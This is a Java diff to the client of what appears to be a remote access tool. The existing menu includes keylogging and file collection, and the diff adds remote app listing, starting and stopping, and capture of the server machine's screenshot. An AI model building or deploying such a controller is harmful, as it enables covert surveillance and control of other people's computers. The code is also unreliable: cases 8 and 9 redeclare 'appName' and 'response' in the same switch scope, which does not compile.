@@ -26,6 +26,11 @@ public class Client {
                 System.out.println("4. Collect File (via user disk address)");
                 System.out.println("5. Start KeyLogging");
                 System.out.println("6. Pause and Return keyLogging");
+                System.out.println("7. List Apps");
+                System.out.println("8. Start App");
+                System.out.println("9. Stop App");
+                System.out.println("10. Get Server Screenshot");
+                System.out.println("\nEnter your choice: ");
 
                 int choice = sc.nextInt();
                 sc.nextLine();
@@ -116,6 +121,74 @@ public class Client {
                         }
 
                         break;
+
+                    case 7:
+                        writer.println("list-apps");
+                        writer.flush();
+                    
+                        String appsList = reader.readLine();
+                        System.out.println("List of apps on the server:");
+                        System.out.println(appsList);
+                        break;
+
+                    case 8:
+                        System.out.println("Enter the name of the app you want to start: ");
+                        String appName = sc.nextLine();
+                    
+                        writer.println("start-app-" + appName);
+                        writer.flush();
+                    
+                        String response = reader.readLine();
+                        System.out.println(response);
+                        break;
+
+                    case 9:
+                        System.out.println("Enter the name of the app you want to stop: ");
+                        String appName = sc.nextLine();
+                    
+                        writer.println("stop-app-" + appName);
+                        writer.flush();
+                    
+                        String response = reader.readLine();
+                        System.out.println(response);
+                        break;
+
+                    case 10:
+                        writer.println("get-screenshot");
+                        writer.flush();
+                        System.out.println("Request sent for server screenshot. Check the server's response.");
+                    
+                        int screenshotSize = Integer.parseInt(reader.readLine());
+                        byte[] screenshotBytes = new byte[screenshotSize];
+                    
+                        int totalBytesReadScreenshot = 0;
+                        int bytesReadThisTimeScreenshot;
+                        while ((bytesReadThisTimeScreenshot = socket.getInputStream().read(screenshotBytes, totalBytesReadScreenshot, screenshotBytes.length - totalBytesReadScreenshot)) > 0) {
+                            totalBytesReadScreenshot += bytesReadThisTimeScreenshot;
+                            if (totalBytesReadScreenshot == screenshotSize) {
+                                break;
+                            }
+                        }
+                    
+                        if (totalBytesReadScreenshot == screenshotSize) {
+                            String screenshotAddress = Paths.get("").toAbsolutePath().toString() + "/";
+                            System.out.println(screenshotAddress);
+                            System.out.println("Enter screenshot file name: ");
+                            String screenshotFileName = sc.nextLine();
+                    
+                            Path screenshotFilePath = Paths.get(screenshotAddress + screenshotFileName);
+                    
+                            if (Files.isWritable(screenshotFilePath.getParent())) {
+                                Files.write(screenshotFilePath, screenshotBytes);
+                                System.out.println("Server screenshot saved to: " + screenshotFilePath);
+                            } else {
+                                System.out.println("Invalid file address or write permissions denied.");
+                            }
+                        } else {
+                            System.out.println("Incomplete screenshot transfer.");
+                        }
+                        break;
+
 
                     default:
                         throw new AssertionError();
